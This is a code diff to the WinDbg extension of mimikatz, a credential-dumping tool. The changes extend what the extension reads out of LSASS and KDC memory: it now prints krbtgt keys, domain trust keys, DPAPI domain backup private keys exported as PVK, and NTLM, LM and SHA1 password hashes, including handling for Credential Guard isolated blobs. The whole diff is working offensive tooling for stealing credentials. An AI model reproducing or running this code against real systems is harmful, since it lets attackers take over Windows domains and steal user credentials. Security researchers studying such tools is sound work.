@@ -115,6 +115,7 @@ DECLARE_API(mimikatz)
 	
 	if(pSecData = GetExpression("kdcsvc!SecData"))
 	{
+		dprintf("\nkrbtgt keys\n===========\n");
 		if(ReadMemory(pSecData + SECDATA_KRBTGT_OFFSET*sizeof(PVOID), &dualKrbtgt, 2*sizeof(PVOID), NULL))
 		{
 			kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_current, "Current");
@@ -124,9 +125,13 @@ DECLARE_API(mimikatz)
 #ifdef _M_X64
 	if(pDomainList = GetExpression("kdcsvc!KdcDomainList"))
 	{
+		dprintf("\nDomain List\n===========\n");
 		kuhl_m_sekurlsa_krbtgt_trust(pDomainList);
 	}
 #endif
+	kuhl_sekurlsa_dpapi_backupkeys();
+
+	dprintf("\nSekurLSA\n========\n");
 	if(NT_SUCCESS(kuhl_m_sekurlsa_nt6_init()))
 	{
 		if(pInitializationVector && phAesKey && ph3DesKey)
@@ -269,29 +274,27 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds10, &pPrimaryCreds10->LogonDomainName, FALSE);
 
 					dprintf("\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds10->UserName, &pPrimaryCreds10->LogonDomainName);
-					dprintf("\n\t * Flags    : %02x/N%02x/L%02x/S%02x/%02x/%02x/%02x/%02x", pPrimaryCreds10->isUnk0, pPrimaryCreds10->isNtOwfPassword, pPrimaryCreds10->isLmOwfPassword, pPrimaryCreds10->isShaOwPassword, pPrimaryCreds10->isUnk1, pPrimaryCreds10->isUnk2, pPrimaryCreds10->isUnk3, pPrimaryCreds10->isUnk4);
-					if(pPrimaryCreds10->isLmOwfPassword)
+					dprintf("\n\t * Flags    : I%02x/N%02x/L%02x/S%02x", pPrimaryCreds10->isIso, pPrimaryCreds10->isNtOwfPassword, pPrimaryCreds10->isLmOwfPassword, pPrimaryCreds10->isShaOwPassword);
+					if(!pPrimaryCreds10->isIso)
 					{
-						dprintf("\n\t * LM       : ");
-						kull_m_string_dprintf_hex(pPrimaryCreds10->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+						if(pPrimaryCreds10->isLmOwfPassword)
+						{
+							dprintf("\n\t * LM       : ");
+							kull_m_string_dprintf_hex(pPrimaryCreds10->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+						}
+						if(pPrimaryCreds10->isNtOwfPassword)
+						{
+							dprintf("\n\t * NTLM     : ");
+							kull_m_string_dprintf_hex(pPrimaryCreds10->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+						}
+						if(pPrimaryCreds10->isShaOwPassword)
+						{
+							dprintf("\n\t * SHA1     : ");
+							kull_m_string_dprintf_hex(pPrimaryCreds10->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
+						}
 					}
-					if(pPrimaryCreds10->isNtOwfPassword)
-					{
-						dprintf("\n\t * NTLM     : ");
-						kull_m_string_dprintf_hex(pPrimaryCreds10->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
-					}
-					if(pPrimaryCreds10->isShaOwPassword)
-					{
-						dprintf("\n\t * SHA1     : ");
-						kull_m_string_dprintf_hex(pPrimaryCreds10->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
-					}
-					dprintf("\n\t * unknow   : ");
-					for(i = 0; !isNull && (i < 128); i++)
-						isNull |= !pPrimaryCreds10->UnkStruct[i];
-					if(isNull)
-						dprintf("[0..0]");
 					else
-						kull_m_string_dprintf_hex(pPrimaryCreds10->UnkStruct, 128, 0);
+						kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) ((PBYTE) pPrimaryCreds10 + FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, align0) + sizeof(USHORT)));
 					break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
 					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
@@ -335,22 +338,33 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST)
 		{
 			pHashPassword = (PKERB_HASHPASSWORD_6) mesCreds;
-			dprintf("\n\t\t%s : ", kuhl_m_kerberos_ticket_etype(pHashPassword->Type));
+			dprintf("\t   %s ", kuhl_m_kerberos_ticket_etype(pHashPassword->Type));
 			if(buffer.Length = buffer.MaximumLength = (USHORT) pHashPassword->Size)
 			{
 				buffer.Buffer = (PWSTR) pHashPassword->Checksump;
 				if(kull_m_string_getDbgUnicodeString(&buffer))
 				{
-					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
-						kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(buffer.Buffer, buffer.MaximumLength);
-					kull_m_string_dprintf_hex(buffer.Buffer, buffer.Length, 0);
+					if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10) && (pHashPassword->Size > FIELD_OFFSET(LSAISO_DATA_BLOB, data)))
+					{
+						kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) buffer.Buffer);
+					}
+					else
+					{
+						if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
+							kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(buffer.Buffer, buffer.MaximumLength);
+						kull_m_string_dprintf_hex(buffer.Buffer, buffer.Length, 0);
+					}
 					LocalFree(buffer.Buffer);
 				}
 			}
 			else dprintf("<no size, buffer is incorrect>");
+			dprintf("\n");
 		}
 		else
 		{
+			if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10)
+				mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL) mesCreds)->Password;
+
 			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
 			{
 				if(kull_m_string_getDbgUnicodeString(&mesCreds->UserName) && kull_m_string_suspectUnicodeString(&mesCreds->UserName))
@@ -432,6 +446,16 @@ VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
 	}
 	kull_m_string_dprintf_hex((PBYTE) *dirtyBase + sizeof(ULONG), key->length, 0);
 	*dirtyBase = (PBYTE) *dirtyBase + sizeof(ULONG) + *(PULONG) *dirtyBase;
+}
+
+VOID kuhl_m_sekurlsa_genericLsaIsoOutput(PLSAISO_DATA_BLOB blob)
+{
+	dprintf("\n\t   * LSA Isolated Data: %.*s", blob->typeSize, blob->data);
+	dprintf("\n\t     Unk-Key  : "); kull_m_string_dprintf_hex(blob->unkKeyData, 3*16, 0);
+	dprintf("\n\t     Encrypted: "); kull_m_string_dprintf_hex(blob->data + blob->typeSize, blob->origSize, 0);
+	//kprintf(L"\n\t\t   SS:%u, TS:%u, DS:%u", blob->structSize, blob->typeSize, blob->origSize);
+	//kprintf(L"\n\t\t   0:0x%x, 1:0x%x, 2:0x%x, 3:0x%x, 4:0x%x, E:", blob->unk0, blob->unk1, blob->unk2, blob->unk3, blob->unk4);
+	//kull_m_string_wprintf_hex(blob->unkEmpty, 20, 0);
 }
 
 void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, LPCSTR prefix)
@@ -551,3 +575,92 @@ void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info)
 	}
 }
 #endif
+
+void kuhl_sekurlsa_dpapi_display_backupkey(ULONG_PTR pGuid, ULONG_PTR pPb, ULONG_PTR pCb, PCSTR text)
+{
+	GUID guid;
+	DWORD cb, szPVK;
+	PVOID tmpPtr;
+	PKIWI_BACKUP_KEY buffer;
+	PVK_FILE_HDR pvkHeader = {PVK_MAGIC, PVK_FILE_VERSION_0, AT_KEYEXCHANGE, PVK_NO_ENCRYPT, 0, 0};
+	PBYTE pExport = NULL;
+
+	if(pGuid && pPb && pCb)
+	{
+		dprintf("\n%s", text);
+		if(ReadMemory(pGuid, &guid, sizeof(GUID), NULL))
+			kull_m_string_displayGUID(&guid);
+		dprintf("\n");
+
+		if(ReadMemory(pCb, &cb, sizeof(DWORD), NULL) && ReadMemory(pPb, &tmpPtr, sizeof(PVOID), NULL))
+		{
+			if(cb && tmpPtr)
+			{
+				if(buffer = (PKIWI_BACKUP_KEY) LocalAlloc(LPTR, cb))
+				{
+					if(ReadMemory((ULONG_PTR) tmpPtr, buffer, cb, NULL))
+					{
+						switch(buffer->version)
+						{
+						case 2:
+							dprintf("  * RSA key\n");
+							pvkHeader.cbPvk = buffer->keyLen;
+							szPVK = sizeof(PVK_FILE_HDR) + pvkHeader.cbPvk ;
+							if(pExport = (PBYTE) LocalAlloc(LPTR, szPVK))
+							{
+								RtlCopyMemory(pExport, &pvkHeader, sizeof(PVK_FILE_HDR));
+								RtlCopyMemory(pExport + sizeof(PVK_FILE_HDR), buffer->data, pvkHeader.cbPvk);
+								dprintf("\tPVK (private key)\n"); kull_m_string_dprintf_hex(pExport, szPVK, (32 << 16)); dprintf("\n");
+								LocalFree(pExport);
+							}
+							dprintf("\tDER (public key and certificate)\n"); kull_m_string_dprintf_hex(buffer->data + buffer->keyLen, buffer->certLen, (32 << 16)); dprintf("\n");
+							break;
+						case 1:
+							dprintf("  * Legacy key\n");
+							kull_m_string_dprintf_hex((PBYTE) buffer + sizeof(DWORD), cb - sizeof(DWORD), (32 << 16));
+							dprintf("\n");
+							break;
+						default:
+							dprintf("  * Unknown key (seen as %08x)\n", buffer->version);
+							kull_m_string_dprintf_hex((PBYTE) buffer, cb, (32 << 16));
+							dprintf("\n");
+						}
+					}
+					LocalFree(buffer);
+				}
+			}
+		}
+	}
+}
+
+void kuhl_sekurlsa_dpapi_backupkeys()
+{
+	ULONG_PTR g_guidPreferredKey, g_pbPreferredKey, g_cbPreferredKey, g_guidW2KPreferredKey, g_pbW2KPreferredKey, g_cbW2KPreferredKey;
+
+	if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_8)
+	{
+		g_guidPreferredKey = GetExpression("lsasrv!g_guidPreferredKey");
+		g_pbPreferredKey = GetExpression("lsasrv!g_pbPreferredKey");
+		g_cbPreferredKey = GetExpression("lsasrv!g_cbPreferredKey");
+		g_guidW2KPreferredKey = GetExpression("lsasrv!g_guidW2KPreferredKey");
+		g_pbW2KPreferredKey = GetExpression("lsasrv!g_pbW2KPreferredKey");
+		g_cbW2KPreferredKey = GetExpression("lsasrv!g_cbW2KPreferredKey");
+	}
+	else
+	{
+		g_guidPreferredKey = GetExpression("dpapisrv!g_guidPreferredKey");
+		g_pbPreferredKey = GetExpression("dpapisrv!g_pbPreferredKey");
+		g_cbPreferredKey = GetExpression("dpapisrv!g_cbPreferredKey");
+		g_guidW2KPreferredKey = GetExpression("dpapisrv!g_guidW2KPreferredKey");
+		g_pbW2KPreferredKey = GetExpression("dpapisrv!g_pbW2KPreferredKey");
+		g_cbW2KPreferredKey = GetExpression("dpapisrv!g_cbW2KPreferredKey");
+	}
+	
+	if((g_guidPreferredKey && g_pbPreferredKey && g_cbPreferredKey) || (g_guidW2KPreferredKey && g_pbW2KPreferredKey && g_cbW2KPreferredKey))
+	{
+		dprintf("\nDPAPI Backup keys\n=================\n");
+		kuhl_sekurlsa_dpapi_display_backupkey(g_guidPreferredKey, g_pbPreferredKey, g_cbPreferredKey, "Current prefered key:       ");
+		kuhl_sekurlsa_dpapi_display_backupkey(g_guidW2KPreferredKey, g_pbW2KPreferredKey, g_cbW2KPreferredKey, "Compatibility prefered key: ");
+	}
+	
+}
